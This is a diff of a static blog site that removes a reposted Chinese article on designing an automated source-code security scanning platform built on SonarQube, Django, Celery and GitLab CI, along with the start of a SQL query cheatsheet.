-<li>task.codeaudit: 负责调度扫描引擎。</li>
-<li>sonarqube.codeauit: SonarQube的后台服务端。</li>
-</ul>
-<h3 id="2-技术说明"><a href="#2-技术说明" class="headerlink" title="2 技术说明"></a>2 技术说明</h3><p>这里会讨论到所需的具体技术点，有些技术或方法可能不是最佳的方案，但是已经过我们测试检验是可行的。</p>
-<p>以下为实际开发中用到的一些技能：</p>
-<ul>
-<li>Python/Django/Jquery/Celery</li>
-<li>Gitlab API/Sonar API</li>
-<li>Git/Gitlab CI/Jenkins</li>
-<li>Centos 7/Shell</li>
-<li>NFS/Nginx/uWSGI</li>
-<li>MySQL/RabbitMQ/Redis</li>
-<li>安全漏洞知识</li>
-</ul>
-<p><strong>CentOS 7</strong></p>
-<p>CentOS 7 与 6 的版本会有一些区别，我们需要具有 Linux 的基本操作基础，了解 systemctl、firewall-cmd、crontab等命令；了解SELinux，修改SELinux状态；并能编写systemd的自启动脚本。</p>
-<p><strong>Git</strong></p>
-<p>了解 Git 的基本操作命令，使用 SSH 密钥的方式提交或拉取代码; 熟悉git clone、git log、git pull、git branch、git remote、git fetch、git for-each-ref、git ls-files等基本命令的操作。</p>
-<p>例如：</p>
-<ul>
-<li>使用git for-each-ref来得到当前分支的最后一次 commit id；</li>
-<li>使用git ls-files来判断项目中是否存在sonar-project.properties配置文件；</li>
-<li>使用git log -n1 /path/file来获取文件最后一次 commit 的作者。</li>
-</ul>
-<p><strong>CI/CD</strong></p>
-<p>不论是集成到 Gitlab CI 或是Jenkins, 我们都需要先了解项目上线的基本流程，如：开发的代码规范、测试环节（单元测试/功能测试）、发布部署环节等。一般我们会将代码扫描环节放在在测试环节后，发布部署前。</p>
-<p><strong>Python</strong></p>
-<p>这里我们使用Python进行后台的服务端开发，使用Django进行前台 UI 的开发，使用django-rest-swagger来开发 API 接口，使用Celery作为扫描任务的调度框架。</p>
-<p><strong>数据库与中间件</strong></p>
-<p>数据库我们选择使用 MySQL 5.7(或MariaDB, 他们在使用上没有太大的区别); Celery 的消息中间件可以使用 Redis 或是 RabbitMQ，这里你可以在开发的时候使用 Redis，正式部署时使用 RabbitMQ。</p>
-<p><strong>安全漏洞知识</strong></p>
-<ul>
-<li>了解 OWASP TOP 10 的漏洞类型原理与解决方案；</li>
-<li>了解 CWE 的漏洞信息；</li>
-<li>了解公司主流的开发语言。</li>
-</ul>
-<h3 id="3-模块设计"><a href="#3-模块设计" class="headerlink" title="3 模块设计"></a>3 模块设计</h3><p>下图中我们自上而下按照逻辑大致划分了”四”层：UI层、存储层、服务层、任务调度扫描引擎层（由于任务调度与服务同在后台运行，所以又统称为服务层）。</p>
-<p><img src="\assets\img\auto_scan\2.png" alt=""></p>
-<ul>
-<li><p>UI 层</p>
-<p>  提供扫描系统的后台管理、API接口、漏洞知识库等一系列的交互功能入口，不同的人员或系统可以根据各自的需求通过不同的交互接口来满足自己需求。如：CI/CD系统可通过 API 接口创建扫描任务并获取扫描结果；安全审计人员可通过后台进行规则或插件的添加；开发人员可通过漏洞知识库来获取相关语言或技术的漏洞信息。</p>
-</li>
-<li><p>存储层</p>
-<p>  主要包括关系型数据库、消息中间件(指MQ)、NFS(网络文件系统)，这里我们使用了 MySQL 5.7 的数据库； RabbitMQ 是作为 Celery 调度框架的消息中间件；NFS担当网络共享存储，用于存储代码与扫描日志。</p>
-</li>
-<li><p>调度层</p>
-<p>  扫描任务的执行流程，主要可分为：</p>
-<ul>
-<li>初始化：扫描任务的环境初始化，如：日志目录、日志文件、加载插件、加载漏洞规则等；</li>
-<li>分析项目：项目代码统计、依赖组件统计、漏洞知识库关联等；</li>
-<li>扫描漏洞：调用第三方扫描引擎、统计扫描结果；</li>
-<li>漏报处理：使用黑名单规则和插件进行扫描；</li>
-<li>误报处理：使用白名单规则和插件进行误报处理；</li>
-<li>闭环漏洞：针对高危漏洞在 GitLab 或 Jira 系统中创建一个 Issue。</li>
-</ul>
-</li>
-<li><p>服务层</p>
-<p>  后台的服务，其主要包括：GitLab 系统中的项目同步、报表生成、调度进程监控。</p>
-</li>
-</ul>
-<h2 id="0x03-系统功能"><a href="#0x03-系统功能" class="headerlink" title="0x03 系统功能"></a>0x03 系统功能</h2><h3 id="1-数据库设计"><a href="#1-数据库设计" class="headerlink" title="1 数据库设计"></a>1 数据库设计</h3><p><strong>权限相关</strong></p>
-<p>权限控制，这里使用 django 自带的权限表来进行权限控制，我们可以通过auth_group表来创建用户组，为不同的用户组赋予不同的角色权限auth_group_permissions，你可以访问<a href="https://docs.djangoproject.com/en/2.1/topics/auth/default/#topic-authorization" target="_blank" rel="noopener">官方地址</a> 来获得更多关于权限的信息。</p>
-<p>django 权限表如下：</p>
-<ul>
-<li>auth_group</li>
-<li>auth_group_permissions</li>
-<li>auth_permission</li>
-<li>auth_user</li>
-<li>auth_user_groups</li>
-<li>auth_user_user_permissions</li>
-</ul>
-<p><img src="\assets\img\auto_scan\3.png" alt=""></p>
-<p><strong>项目相关</strong></p>
-<p>项目表主要包括：项目组、项目、分支与TAG、统计信息、依赖组件、插件规则、扫描任务等相关表。</p>
-<p><img src="\assets\img\auto_scan\4.png" alt=""></p>
-<p><strong>漏洞知识库</strong></p>
-<p>漏洞知识库，这里主要存储漏洞类型、漏洞知识等内容。</p>
-<p><img src="\assets\img\auto_scan\5.png" alt=""></p>
-<p><strong>系统相关</strong></p>
-<p>系统表主要包括系统的安全周报、节点监控、系统日志等信息。</p>
-<p><img src="\assets\img\auto_scan\6.png" alt=""></p>
-<h3 id="2-UI系统"><a href="#2-UI系统" class="headerlink" title="2 UI系统"></a>2 UI系统</h3><p>扫描系统的后台，方便安全审计人员管理项目和系统。</p>
-<h4 id="2-1-项目管理"><a href="#2-1-项目管理" class="headerlink" title="2.1 项目管理"></a>2.1 项目管理</h4><p><strong>2.1.1 项目组</strong></p>
-<p>项目组我们通过 GitLab 的 API 同步所有项目组信息到我们的扫描系统，项目组的信息包括：<code>项目组名称、项目组描述、创建时间、URL地址、项目成员</code>等。</p>
-<p><strong>2.1.2 项目</strong></p>
-<p>项目是从分组中获取得到，需要注意的是可能会存在项目名相同但分组不同的情况。项目基本信息应包括：项目名称、项目描述、所属分组、默认分支、Git地址、项目成员、代码统计、依赖组件、分支管理、TAG管理等。</p>
-<p><img src="\assets\img\auto_scan\7.png" alt=""></p>
-<p><strong>2.1.3 扫描任务</strong></p>
-<p>扫描任务会有四种状态：等待调度、正在扫描、扫描完成、扫描失败。每一次创建扫描任务时，都会查询是否存在等待调度或正在扫描的任务，如果存在则提示创建失败。</p>
-<p><img src="\assets\img\auto_scan\8.png" alt=""></p>
-<h4 id="2-2-规则插件"><a href="#2-2-规则插件" class="headerlink" title="2.2 规则插件"></a>2.2 规则插件</h4><p><strong>2.2.1 规则</strong></p>
-<p>这里使用正则表达式来做特征匹配，并可通过限定文件的后缀来提高精准度。</p>
-<p>正则表达式标志位：</p>
-<ul>
-<li>忽略大小写</li>
-<li>支持多行匹配</li>
-</ul>
-<p><img src="\assets\img\auto_scan\9.png" alt=""></p>
-<p><strong>2.2.2 插件</strong></p>
-<p>这里使用了 Python 的反射机制，任务初始化时会优先初始化插件，当扫描完成时，扫描引擎会使用插件批量进行检测。插件入口函数为run()，漏洞详情对象会作为**kwargs参数的上下文传到该函数中。</p>
-<p><img src="\assets\img\auto_scan\10.png" alt=""></p>
-<p><strong>2.2.3 规则知识库</strong></p>
-<p>规则知识库是区别与漏洞知识库的，往往规则知识库的内容要比漏洞知识库的内容简单，但是结构清晰。如：漏洞示例代码、漏洞说明、解决办法、参考链接等信息。</p>
-<p><img src="\assets\img\auto_scan\11.png" alt=""></p>
-<h4 id="2-3-漏洞知识库"><a href="#2-3-漏洞知识库" class="headerlink" title="2.3 漏洞知识库"></a>2.3 漏洞知识库</h4><p><strong>2.3.1 漏洞类型</strong></p>
-<p>这里建议使用 CWE 的漏洞标准，可参考这个文档：<a href="https://www.hackerone.com/sites/default/files/2017-03/WeaknessAndLegacyVulnerabilityTypeRelationship.pdf" target="_blank" rel="noopener">文档1</a></p>
-<p><img src="\assets\img\auto_scan\12.png" alt=""></p>
-<p><strong>2.3.2 漏洞管理</strong></p>
-<p>主要包括添加漏洞和管理漏洞，漏洞的信息应该包括：CVE/CNVD/CNNVD编号、漏洞标题、风险等级、漏洞来源、发现时间、受影响范围、漏洞详情、漏洞类型、解决版本等基本信息。</p>
-<p><img src="\assets\img\auto_scan\13.png" alt=""></p>
-<p>这里我们要实现漏洞知识库与识别出的组件联动功能，主要通过两个属性：</p>
-<ul>
-<li><p>组件标签</p>
-<p>  这里需要为每个漏洞添加一个 Tag 属性，其属性值如：org.springframework、com.alibaba.fastjson，建议标签一律使用小写字母。</p>
-</li>
-<li><p>版本规则</p>
-<p>  使用正则表达式来进行匹配，如：CVE-2018-1270 中受影响的 Spring Framework 版本为：5.0.x-5.0.5 和 4.3.x-4.3.16，那么我们的规则可以写成如下：</p>
-<p>  <img src="\assets\img\auto_scan\14.png" alt=""></p>
-</li>
-</ul>
-<h4 id="2-4-报表管理"><a href="#2-4-报表管理" class="headerlink" title="2.4 报表管理"></a>2.4 报表管理</h4><p><strong>2.4.1 语言与项目统计</strong></p>
-<p>按照年份进行项目的语言统计</p>
-<p><img src="\assets\img\auto_scan\15.png" alt=""></p>
-<p><strong>2.4.2 周期性漏洞统计</strong></p>
-<blockquote>
-<p>每季度漏洞数对比</p>
-</blockquote>
-<p>季度统计是为了对比同一段时期的漏洞数。</p>
-<p><img src="\assets\img\auto_scan\16.png" alt=""></p>
-<blockquote>
-<p>高危漏洞趋势图</p>
-</blockquote>
-<p>高危漏洞环比，今年实施的安全政策是否合乎预期，可以大概分析出来。</p>
-<p><img src="\assets\img\auto_scan\17.png" alt=""></p>
-<h3 id="3-API接口"><a href="#3-API接口" class="headerlink" title="3 API接口"></a>3 API接口</h3><h4 id="3-1-接口认证"><a href="#3-1-接口认证" class="headerlink" title="3.1 接口认证"></a>3.1 接口认证</h4><p>使用 rest_framework 的 API 来做验证，首先根据登陆的用户 id 生成一个 Token。</p>
-<p><img src="\assets\img\auto_scan\18.png" alt=""></p>
-<p>验证接口使用说明，添加 Authorization 的认证 Token。</p>
-<p><img src="\assets\img\auto_scan\19.png" alt=""></p>
-<h4 id="3-2-项目信息接口"><a href="#3-2-项目信息接口" class="headerlink" title="3.2 项目信息接口"></a>3.2 项目信息接口</h4><p><strong>信息同步</strong></p>
-<p>为什么需要信息同步？这是因为 GitLab 中的项目名称可能不是最终上线的 APP 名称(这里有些绕)。拿一个 Java 的项目举例，该项目的 GitLab 地址为：<a href="http://git.companyname.com/A/cloud，那么这个Java的包名有可能是" target="_blank" rel="noopener">http://git.companyname.com/A/cloud，那么这个Java的包名有可能是</a> com.companyname.cloud。</p>
-<p>我们使用项目的 git 地址来同步信息，建议把 git 地址全部转换为小写。APP 的名称(包名)可以 CI/CD 系统获取或是通过配置文件的硬编码方式来定义。</p>
-<p><img src="\assets\img\auto_scan\20.png" alt=""></p>
-<p><strong>创建扫描</strong></p>
-<p>信息同步完成后，我们就可以根据 APP 名称和 git 地址来创建一个扫描任务，请求参数参考如下：</p>
-<ul>
-<li>app_name: APP名称(可选)</li>
-<li>module_name: 模块名称(可选)</li>
-<li>version: 当前版本(可选)</li>
-<li>git_url: git地址 (必选)</li>
-<li>branch_name: 分支名称(必选)</li>
-</ul>
-<h4 id="3-3-任务信息接口"><a href="#3-3-任务信息接口" class="headerlink" title="3.3 任务信息接口"></a>3.3 任务信息接口</h4><ul>
-<li><p>查询扫描任务</p>
-<p>  根据项目的 git 地址、分支来查询扫描任务，你也可以根据上一步创建扫描任务的 ID 来查询扫描结果。</p>
-</li>
-<li><p>查询任务漏洞列表</p>
-<p>  当扫描任务状态为扫描完成/扫描失败时，就可以根据任务 ID 来查询扫描出的安全漏洞信息。</p>
-</li>
-</ul>
-<h4 id="3-4-漏洞规则接口"><a href="#3-4-漏洞规则接口" class="headerlink" title="3.4 漏洞规则接口"></a>3.4 漏洞规则接口</h4><ul>
-<li><p>查询漏洞规则知识</p>
-<p>  通过漏洞信息中的漏洞规则 ID 或者 Key 来查询相关的规则知识库，该知识库应当包括：漏洞原因、漏洞示例代码、解决修复意见等。</p>
-</li>
-</ul>
-<h3 id="4-后台服务"><a href="#4-后台服务" class="headerlink" title="4 后台服务"></a>4 后台服务</h3><h4 id="4-1-gitlab-的信息同步"><a href="#4-1-gitlab-的信息同步" class="headerlink" title="4.1 gitlab 的信息同步"></a>4.1 gitlab 的信息同步</h4><p>使用 crontab 每两个小时遍历一遍 GitLab 上的所有项目，并同步项目信息到扫描系统中。</p>
-<p><img src="\assets\img\auto_scan\21.png" alt=""></p>
-<h4 id="4-2-报表生成服务"><a href="#4-2-报表生成服务" class="headerlink" title="4.2 报表生成服务"></a>4.2 报表生成服务</h4><p>使用 crontab 每日凌晨12点生成，季度对比和年度的安全统计数据。</p>
-<h4 id="4-3-扫描进程监控"><a href="#4-3-扫描进程监控" class="headerlink" title="4.3 扫描进程监控"></a>4.3 扫描进程监控</h4><p>使用ps aux| grep codescan来查看进程是否存活，当然这种暴力方式不能检测到进程的业务健康度的(比如：扫描任务卡死，状态一直为：正在扫描)。</p>
-<h3 id="5-SonarQube-搭建"><a href="#5-SonarQube-搭建" class="headerlink" title="5 SonarQube 搭建"></a>5 SonarQube 搭建</h3><h4 id="5-1-服务搭建"><a href="#5-1-服务搭建" class="headerlink" title="5.1 服务搭建"></a>5.1 服务搭建</h4><p>下载最新版本<a href="https://www.sonarqube.org/downloads/上传到sonarqube.codeauit服务器上并解压。进入到bin/linux-x86-64/目录下，执行" target="_blank" rel="noopener">https://www.sonarqube.org/downloads/上传到sonarqube.codeauit服务器上并解压。进入到bin/linux-x86-64/目录下，执行</a> sh ./sonar.sh start。 SonarQube 启动成功后，使用浏览器打开<a href="http://192.168.10.3:9000" target="_blank" rel="noopener">http://192.168.10.3:9000</a>, 输入 admin/admin 即可正常访问。</p>
-<h4 id="5-2-插件管理"><a href="#5-2-插件管理" class="headerlink" title="5.2 插件管理"></a>5.2 插件管理</h4><p>SonarQube 6.4 版本登陆的后台管理系统，选择 “配置” -&gt; “系统” -&gt; “更新中心” ， 选择对应插件点击 “Install” 进行安装。</p>
-<p>SonarQube 7.3 版本， “Administration” -&gt; “Marketplace”， 选择对应插件点击 “Install” 进行安装。</p>
-<p><img src="\assets\img\auto_scan\22.png" alt=""></p>
-<h3 id="6-引擎调度"><a href="#6-引擎调度" class="headerlink" title="6 引擎调度"></a>6 引擎调度</h3><p>程序部署在 “task.codeaudit” 服务器上，服务需要安装 cloc 与 sonar-scanner 工具。</p>
-<h4 id="6-1-代码同步"><a href="#6-1-代码同步" class="headerlink" title="6.1 代码同步"></a>6.1 代码同步</h4><p>同步代码分为以下几个步骤：</p>
-<ul>
-<li><p>克隆项目</p>
-<p>  这里可能会遇到一些坑，比如项目历史比较久远，完整克隆下来可能会达到上百M或G，我们这里可以使用–depth 1参数进行克隆下载。有的项目可能会存在不规范的情况，比如拿 git 当 svn 使用，每个版本创建一个目录。</p>
-</li>
-<li><p>切换分支</p>
-<p>  根据扫描任务中的分支名称 checkout 到指定分支。</p>
-</li>
-<li><p>更新代码</p>
-<p>  针对已经克隆的项目进行 pull 操作，来同步 GitLab 上的项目更新代码。</p>
-</li>
-</ul>
-<h4 id="6-2-sonar-scanner-扫描"><a href="#6-2-sonar-scanner-扫描" class="headerlink" title="6.2 sonar-scanner 扫描"></a>6.2 sonar-scanner 扫描</h4><p>ssh 登录到task.codeaudit服务器上，执行cd opt &amp;&amp; wget <a href="https://sonarsource.bintray.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-3.2.0.1227-linux.zip" target="_blank" rel="noopener">https://sonarsource.bintray.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-3.2.0.1227-linux.zip</a> &amp;&amp; unzip sonar-scanner-cli-3.2.0.1227-linux.zip来下载并解压，执行成功后使用ln -s /opt/sonar-scanner-3.2.0.1227-linux/bin/sonar-scanner /usr/bin/sonar-scanner命令创建一个sonar-scanner 的软连接。这里我们会使用sonar-scanner命令来进行项目的代码扫描。</p>
-<p>你也可以通过<a href="https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner来下载不同平台的sonar-scanner-cli-3.2.0.1227-linux.zip。" target="_blank" rel="noopener">https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner来下载不同平台的sonar-scanner-cli-3.2.0.1227-linux.zip。</a></p>
-<p><img src="\assets\img\auto_scan\23.png" alt=""></p>
-<h4 id="6-3-代码统计"><a href="#6-3-代码统计" class="headerlink" title="6.3 代码统计"></a>6.3 代码统计</h4><p>使用cloc工具进行文件与代码行数的统计, 这里你可能需要通过–exclude-ext、–exclude-dir参数来过滤一些无意义的文件，比如：字体、图片、声音、视频等。举个例子，过滤所有图片后统计：cloc ./目标路径 –exclude-ext=.jpg,.jpeg,.png,.bmp,.gif,.ico。</p>
-<h4 id="6-4-项目组件分析"><a href="#6-4-项目组件分析" class="headerlink" title="6.4 项目组件分析"></a>6.4 项目组件分析</h4><p>组件分析主要是针对如使用 Java 语言开发项目时使用 Maven 管理的 pom.xml 配置文件; Python 中的 requirements.txt 文件；JS 项目中的package.json文件做解析。这里我写了一个clocwalk 工具可以分析项目的依赖组件，这个项目目前已经开源，你可以通过<a href="https://github.com/MyKings/clocwalk地址来获取这个工具。" target="_blank" rel="noopener">https://github.com/MyKings/clocwalk地址来获取这个工具。</a></p>
-<h4 id="6-5-漏报处理"><a href="#6-5-漏报处理" class="headerlink" title="6.5 漏报处理"></a>6.5 漏报处理</h4><p>关于漏报问题，你可以根据自己企业 SRC 中的漏洞，总结出一套适合自己企业的黑名单规则；或者你可以添加一些 CWE 的漏洞规则，关于 CWE 的信息你可以访问这个地址 <a href="https://cwe.mitre.org/data/index.html。" target="_blank" rel="noopener">https://cwe.mitre.org/data/index.html。</a></p>
-<h4 id="6-6-误报处理"><a href="#6-6-误报处理" class="headerlink" title="6.6 误报处理"></a>6.6 误报处理</h4><p>关于误报问题可能会较多，比如扫描出单元测试或功能测试的硬编码问题；比如变量参数String PARAM_NAME_PASSWORD=”passwd_txt”;问题。 以上的问题我们可以通过白名单插件处理，比如插件中对文件路径和方法判断是否存在 test 关键字，如果存在我们就认为这个是误报。另外针对某些特殊类型的误报，比如在 A 项目下才是误报，其他项目就是漏洞的情况，我们可以设置这个项目的白名单漏洞 Case，其匹配规则条件为：项目名称、漏洞文件、漏洞类型、漏洞所在行，当所有条件都同时满足时，那么这个漏洞就会可以判断为误报。</p>
-<h4 id="6-7-漏洞闭环"><a href="#6-7-漏洞闭环" class="headerlink" title="6.7 漏洞闭环"></a>6.7 漏洞闭环</h4><p>当一个高/中危漏洞被发现并确认时，我们应该如何跟踪这个漏洞的生命周期？往往安全人员会将一个漏洞提交到内部的 SOC 系统中，由于 SOC 系统没有和项目开发的流程控制系统（如：Jira）没有直接联系，开发人员可能会忽视或忘记修复这个高危漏洞，如何避免这种情况？我们这里以 GitLab 举例，当扫描系统扫描出高危漏洞时，系统会通过 GitLab 的 POST /projects/:id/issues API接口来自动创建一条 issue 并指派给当前项目的 master，项目负责人同时会收到一条邮件提醒，那么项目负责人可根据漏洞严重程度来安排项目的迭代计划，这样我们就把审计系统扫描出的漏洞与项目开发流程很好的结合起来了。</p>
-<h3 id="7-GitLab-CI-触发"><a href="#7-GitLab-CI-触发" class="headerlink" title="7 GitLab CI 触发"></a>7 GitLab CI 触发</h3><p>当然也可以使用 Jenkins 来做 CI/CD 系统。我们这里开发了一个.code-audit.py触发脚本, Jenkins 你也可以使用 Python 脚本或是开发 Jenkins 插件来达到触发目的。</p>
-<h4 id="7-1-配置项目"><a href="#7-1-配置项目" class="headerlink" title="7.1 配置项目"></a>7.1 配置项目</h4><p>这里需要了解 .gitlab-ci.yml 文件格式的编写，下面是一个 Python 项目的配置。可以看出整个 CI 过程分为 4 个阶段：build、test、codeaudit、deploy。 其中codeaudit是我们的代码扫描阶段，这里我们限制了只有 develop 的动作才会触发扫描。</p>
-<p><img src="\assets\img\auto_scan\24.png" alt=""></p>
-<h4 id="7-2-扫描脚本"><a href="#7-2-扫描脚本" class="headerlink" title="7.2 扫描脚本"></a>7.2 扫描脚本</h4><p>触发扫描脚本如下图，其大体的执行流程如下：</p>
-<ul>
-<li>获取 GitLab CI 中关于项目的环境变量信息；</li>
-<li>设定要拦截的漏洞级别，默认：中、高危漏洞不通过测试；</li>
-<li>同步项目信息到扫描系统，如果失败扫描代码不通过；</li>
-<li>创建扫描任务，如果失败扫描代码不通过；</li>
-<li>异步查询扫描结果，超时时间10分钟，如果超时扫描代码不通过；</li>
-<li>扫描结果完成，统计是否存在预定义级别的漏洞，如果存在扫描代码不通过。</li>
-</ul>
-<p><img src="\assets\img\auto_scan\25.png" alt=""></p>
-<p>下图为整个 CI 过程的截图。</p>
-<p><img src="\assets\img\auto_scan\26.png" alt=""></p>
-<p>下图为代码扫描失败的反馈结果，图中可以看出发现了一个漏洞。</p>
-<p><img src="\assets\img\auto_scan\27.png" alt=""></p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>代码扫描固然重要，但是它不会解决所有项目的安全问题。项目安全应该从多个维度、多角度的来进行。如：项目立项时开始SDL；开发迭代过程中的代码扫描；项目上线前的黑盒测试。</p>
-<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul>
-<li><a href="https://mp.weixin.qq.com/s/tSbWhBh9RQQ5Wduoo18MEg" target="_blank" rel="noopener">代码自动化扫描系统的建设（上）</a></li>
-<li><a href="https://mp.weixin.qq.com/s/4XtIWbkIeCjbNWT2VCFHZg" target="_blank" rel="noopener">代码自动化扫描系统的建设（下）</a></li>
-<li><a href="https://baike.baidu.com/item/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90" target="_blank" rel="noopener">CI (持续集成)</a></li>
-<li><a href="https://baike.baidu.com/item/%E6%8C%81%E7%BB%AD%E4%BA%A4%E4%BB%98" target="_blank" rel="noopener">CD (持续交付)</a></li>
-<li><a href="https://www.owasp.org/index.php/Top_10-2017_Top_10" target="_blank" rel="noopener">OWASP 2017 TOP 10</a></li>
-<li><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html" target="_blank" rel="noopener">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</a></li>
-<li><a href="https://git-scm.com/docs" target="_blank" rel="noopener">https://git-scm.com/docs</a></li>
-<li><a href="https://docs.gitlab.com/ee/api/" target="_blank" rel="noopener">https://docs.gitlab.com/ee/api/</a></li>
-<li><a href="https://about.gitlab.com/features/gitlab-ci-cd/" target="_blank" rel="noopener">https://about.gitlab.com/features/gitlab-ci-cd/</a></li>
-<li><a href="https://docs.gitlab.com/ce/ci/yaml/README.html" target="_blank" rel="noopener">https://docs.gitlab.com/ce/ci/yaml/README.html</a></li>
-<li><a href="https://docs.gitlab.com/ce/ci/examples/README.html" target="_blank" rel="noopener">https://docs.gitlab.com/ce/ci/examples/README.html</a></li>
-<li><a href="https://docs.gitlab.com/ee/api/issues.html" target="_blank" rel="noopener">https://docs.gitlab.com/ee/api/issues.html</a></li>
-<li><a href="https://docs.gitlab.com/runner/install/docker.html" target="_blank" rel="noopener">https://docs.gitlab.com/runner/install/docker.html</a></li>
-<li><a href="https://docs.sonarqube.org/display/DEV/Web+API" target="_blank" rel="noopener">https://docs.sonarqube.org/display/DEV/Web+API</a></li>
-<li><a href="https://docs.djangoproject.com/en/2.1/topics/auth/default/#topic-authorization" target="_blank" rel="noopener">https://docs.djangoproject.com/en/2.1/topics/auth/default/#topic-authorization</a></li>
-<li><a href="https://www.sonarqube.org/downloads/" target="_blank" rel="noopener">https://www.sonarqube.org/downloads/</a></li>
-<li><a href="https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner" target="_blank" rel="noopener">https://docs.sonarqube.org/display/SCAN/Analyzing+with+SonarQube+Scanner</a></li>
-<li><a href="https://www.hackerone.com/sites/default/files/2017-03/WeaknessAndLegacyVulnerabilityTypeRelationship.pdf" target="_blank" rel="noopener">https://www.hackerone.com/sites/default/files/2017-03/WeaknessAndLegacyVulnerabilityTypeRelationship.pdf</a></li>
-<li><a href="https://github.com/MyKings/clocwalk" target="_blank" rel="noopener">https://github.com/MyKings/clocwalk</a></li>
-</ul>
-
+<h3 id="自动化扫描时扫描引擎用什么？"><a href="#自动化扫描时扫描引擎用什么？" class="headerlink" title="自动化扫描时扫描引擎用什么？"></a>自动化扫描时扫描引擎用什么？</h3>
+        
+          <p class="article-more-link ">
+            <a href="/代码自动化扫描系统建设/#more"><i class="fa fa-coffee" style="padding-right: 2px"></i>Read More</a>
+          </p>
+        
       
 
     </div>
@@ -762,7 +289,7 @@
 
     <footer class="article-footer">
       
-        <a data-url="http://pa55w0rd.github.io/代码自动化扫描系统建设/" data-id="cjopkqnt4002uj3t6f1q5gh0c" class="article-share-link" data-share="baidu" data-title="代码自动化扫描系统的建设（转发）">分享到</a>
+        <a data-url="http://pa55w0rd.github.io/代码自动化扫描系统建设/" data-id="cjopl5zvj002tkbt6dipnhky9" class="article-share-link" data-share="baidu" data-title="代码自动化扫描系统的建设（转发）">分享到</a>
       
 
       
@@ -822,164 +349,19 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-
-        <br>
-        <span id="busuanzi_container_page_pv">
-          阅读次数<span id="busuanzi_value_page_pv"></span>
-        </span>
-        <ul>
-<li>目录<br>{:toc}</li>
-</ul>
-<!--
-# 内容 
-1. [ 查找数据的查询 ](#find)
-2. [ 修改数据的查询 ](#modify)
-3. [ 聚合查询 ](#report)
-4. [ 连接查询 ](#joins)
-5. [ 视图查询 ](#view)
-6. [ 修改表的查询 ](#alter) 
-https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md
--->
-<p><a name="find"></a></p>
-<h1 id="1-查找数据的查询"><a href="#1-查找数据的查询" class="headerlink" title="1. 查找数据的查询"></a>1. 查找数据的查询</h1><h3 id="SELECT-用于从数据库中选择数据"><a href="#SELECT-用于从数据库中选择数据" class="headerlink" title="SELECT: 用于从数据库中选择数据"></a><strong>SELECT</strong>: 用于从数据库中选择数据</h3><ul>
-<li><code>SELECT</code> * <code>FROM</code> table_name;</li>
-</ul>
-<h3 id="DISTINCT-用于过滤掉重复的值并返回指定列的行"><a href="#DISTINCT-用于过滤掉重复的值并返回指定列的行" class="headerlink" title="DISTINCT: 用于过滤掉重复的值并返回指定列的行"></a><strong>DISTINCT</strong>: 用于过滤掉重复的值并返回指定列的行</h3><ul>
-<li><code>SELECT DISTINCT</code> column_name;</li>
-</ul>
-<h3 id="WHERE-用于过滤记录-行"><a href="#WHERE-用于过滤记录-行" class="headerlink" title="WHERE: 用于过滤记录/行"></a><strong>WHERE</strong>: 用于过滤记录/行</h3><ul>
-<li><code>SELECT</code> column1, column2 <code>FROM</code> table_name <code>WHERE</code> condition;</li>
-<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> condition1 <code>AND</code> condition2;</li>
-<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> condition1 <code>OR</code> condition2;</li>
-<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE NOT</code> condition;</li>
-<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> condition1 <code>AND</code> (condition2 <code>OR</code> condition3);</li>
-<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE EXISTS</code> (<code>SELECT</code> column_name <code>FROM</code> table_name <code>WHERE</code> condition);</li>
-</ul>
-<h3 id="ORDER-BY-用于结果集的排序，升序（ASC）或者降序（DESC）"><a href="#ORDER-BY-用于结果集的排序，升序（ASC）或者降序（DESC）" class="headerlink" title="ORDER BY: 用于结果集的排序，升序（ASC）或者降序（DESC）"></a><strong>ORDER BY</strong>: 用于结果集的排序，升序（ASC）或者降序（DESC）</h3><ul>
-<li><code>SELECT</code> * <code>FROM</code> table_name <code>ORDER BY</code> column;</li>
-<li><code>SELECT</code> * <code>FROM</code> table_name <code>ORDER BY</code> column <code>DESC</code>;</li>
-<li><code>SELECT</code> * <code>FROM</code> table_name <code>ORDER BY</code> column1 <code>ASC</code>, column2 <code>DESC</code>;</li>
-</ul>
-<h3 id="SELECT-TOP-用于指定从表顶部返回的记录数"><a href="#SELECT-TOP-用于指定从表顶部返回的记录数" class="headerlink" title="SELECT TOP: 用于指定从表顶部返回的记录数"></a><strong>SELECT TOP</strong>: 用于指定从表顶部返回的记录数</h3><ul>
-<li><code>SELECT TOP</code> number columns_names <code>FROM</code> table_name <code>WHERE</code> condition;</li>
-<li><code>SELECT TOP</code> percent columns_names <code>FROM</code> table_name <code>WHERE</code> condition;</li>
-<li>并非所有数据库系统都支持<code>SELECT TOP</code>。 MySQL 中是<code>LIMIT</code>子句</li>
-<li><code>SELECT</code> column_names <code>FROM</code> table_name <code>LIMIT</code> offset, count;</li>
-</ul>
-<h3 id="LIKE-用于搜索列中的特定模式，WHERE-子句中使用的运算符"><a href="#LIKE-用于搜索列中的特定模式，WHERE-子句中使用的运算符" class="headerlink" title="LIKE: 用于搜索列中的特定模式，WHERE 子句中使用的运算符"></a><strong>LIKE</strong>: 用于搜索列中的特定模式，WHERE 子句中使用的运算符</h3><ul>
-<li>% (percent sign) 是一个表示零个，一个或多个字符的通配符</li>
-<li>_ (underscore) 是一个表示单个字符通配符</li>
-<li><code>SELECT</code> column_names <code>FROM</code> table_name <code>WHERE</code> column_name <code>LIKE</code> pattern;</li>
